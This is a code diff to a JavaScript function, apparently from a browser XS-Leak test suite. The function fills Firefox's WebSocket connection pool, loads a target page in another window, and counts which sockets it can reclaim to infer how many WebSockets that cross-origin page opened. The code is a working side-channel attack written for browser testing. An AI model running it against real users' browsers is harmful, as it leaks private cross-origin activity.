@@ -1,13 +1,23 @@
-// here we go
+import {BASE_URL} from '../config.js'
+
+// Firefox counts sockets that are still connecting towards its 200 connection
+// limit, so a hanging endpoint fills the pool without a single handshake
+// completing. /sleep?t=15 never answers with a 101 and outlives this function.
+
 let SOCKETS = []
+
+const WS = `wss://${new URL(BASE_URL).host}/sleep?t=15`
+// Ask for more than the limit so the surplus errors out and removes itself
+const MAX = 250
+const SLOTS = 10
 
 const sleep = (ms) => {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-const exaustWsLimit = (ws, limit) => {
-    for(let id=0; id < limit; id++){
-        let s = new WebSocket(ws)
+const exaustWsLimit = (limit) => {
+    for(let id = 0; id < limit; id++){
+        let s = new WebSocket(WS)
         s.onerror = (e) => {
             SOCKETS = SOCKETS.filter((x) => x !== s)
         }
@@ -15,11 +25,13 @@ const exaustWsLimit = (ws, limit) => {
     }
 }
 
-const killSockets = (n=10) => {
-    for(let id=0; id < n; id++){
+const killSockets = (n = SLOTS) => {
+    let killed = 0
+    while(killed < n && SOCKETS.length){
         SOCKETS.shift().close()
-
+        killed++
     }
+    return killed
 }
 
 const closeAllWs = () => {
@@ -28,30 +40,41 @@ const closeAllWs = () => {
     }
 }
 
+const chromeVersion = () => {
+    let m = navigator.userAgent.match(/Chrom(?:e|ium)\/(\d+)/)
+    return m ? parseInt(m[1], 10) : 0
+}
 
+const leak = async (url, waitTime = 3000) => {
+    // Chromium serializes handshakes per IP, so a hanging endpoint blocks the
+    // queue instead of filling the pool.
+    if(chromeVersion()){
+        return 'Not applicable in Chromium, see WebSocket Leak (GC)'
+    }
 
-const leak = async(url, waitTime=3000, max=200) => {
-    let ws = 'wss://xsinator.com/5sleep' // nonblocking sleep
-    exaustWsLimit(ws, max)
-    // i think we need this here
+    exaustWsLimit(MAX)
     await sleep(500)
-    // save amount of sockets
+
+    // how many we actually hold
     let pageWsLimit = SOCKETS.length
+
     // make room
-    killSockets(10)
-    // open url
+    let killed = killSockets()
     await sleep(500)
+
     window.WW.location = url
-    // wait for WS to connect on url
+    // wait for the WS on url to connect
     await sleep(waitTime)
-    // try to add some more
-    exaustWsLimit(ws, 10)
-    // i think w5 need this here
+
+    // try to take the slots back
+    exaustWsLimit(killed)
     await sleep(400)
-    // calc difference
+
     let res = pageWsLimit - SOCKETS.length
+
     // cleanup
     closeAllWs()
+    SOCKETS = []
     window.WW.location = 'about:blank'
     await sleep(2000)
     return res
